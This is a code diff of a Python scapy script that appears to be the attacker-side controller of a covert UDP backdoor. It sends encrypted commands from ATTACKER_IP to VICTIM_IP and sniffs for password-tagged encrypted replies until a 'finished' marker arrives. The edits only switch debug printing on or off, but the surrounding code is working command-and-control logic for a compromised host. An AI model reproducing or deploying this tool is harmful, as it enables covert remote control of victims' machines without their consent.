@@ -4,14 +4,13 @@ from scapy.layers.inet import IP, UDP
 from crypto import *
 from config import *
 
-
 return_payload = ""
 
 def stp_filter(packet):
-    print("DEBUG: Entering stp_filter")
-    #print("####################RESPONSE_START###################\n")
-    #print decrypt(packet['Raw'].load)
-    #print("####################RESPONSE_END#####################\n")
+    #print("DEBUG: Entering stp_filter")
+    print("####################RESPONSE_START###################\n")
+    print decrypt(packet['Raw'].load)
+    print("####################RESPONSE_END#####################\n")
     if packet.haslayer(Raw):
         if decrypt(packet['Raw'].load) == "finished":
             global return_payload
@@ -22,7 +21,7 @@ def stp_filter(packet):
 
 
 def sniff_callback(packet):
-        print ("DEBUG: Entering sniff_callback")
+        #print ("DEBUG: Entering sniff_callback")
         if packet.haslayer(Raw):
             payload = decrypt(packet['Raw'].load)
             if payload[0:len(PASSWORD)] != PASSWORD:
@@ -45,12 +44,8 @@ def main():
 
         packet = IP(dst=VICTIM_IP, src=ATTACKER_IP) / UDP(sport=int(ATTACKER_PORT), dport=int(VICTIM_PORT)) / cipher_command
 
-
-
         send(packet)
         sniff(filter="udp and src port " + str(VICTIM_PORT) + " and dst port " + str(ATTACKER_PORT), stop_filter=stp_filter, prn=sniff_callback)
-
-
 
 
 if __name__ == '__main__':
